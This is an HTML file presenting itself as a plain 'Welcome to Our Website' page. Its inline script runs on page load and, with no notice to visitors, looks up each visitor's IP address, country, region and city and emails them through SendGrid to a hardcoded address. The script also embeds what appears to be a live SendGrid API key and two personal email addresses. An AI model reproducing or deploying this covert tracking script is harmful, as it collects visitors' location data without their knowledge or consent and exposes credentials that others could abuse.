<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Our Website</title>
</head>
<body>
    <h1>Welcome to Our Website!</h1>
    <p>We hope you enjoy your visit.</p>

    <script>
        // Function to send email with location
        function sendEmailWithLocation(location) {
            var ip = location.ip;
            var country = location.country_name;
            var region = location.region_name;
            var city = location.city;
            var senderEmail = "eyad.s.khoury@hotmail.com"; // Specify sender email address
            var recipientEmail = "imobilejordan@gmail.com"; // Specify recipient email address
            var sendgridApiKey = "SG.XF5DSjVhROqeDzQilrq6|g.cfWTYZPSUmH6x6fYpROT_a5DUVACvSju_ckysrIPrEs"; // Replace with your SendGrid API key

            // Create email body
            var body = "IP Address: " + ip + "\n";
            body += "Country: " + country + "\n";
            body += "Region: " + region + "\n";
            body += "City: " + city;

            // Send email using Fetch API
            fetch('https://api.sendgrid.com/v3/mail/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + sendgridApiKey
                },
                body: JSON.stringify({
                    personalizations: [{
                        to: [{ email: recipientEmail }]
                    }],
                    from: { email: senderEmail },
                    subject: 'User Location',
                    content: [{
                        type: 'text/plain',
                        value: body
                    }]
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log('Email sent successfully.');
                } else {
                    console.error('Failed to send email.');
                }
            });
        }

        // Function to get user's IP address and location
        function getUserLocation() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(location => {
                    // Send email with location
                    sendEmailWithLocation(location);
                });
        }

        // Call getUserLocation function when the page loads
        getUserLocation();
    </script>
</body>
</html>
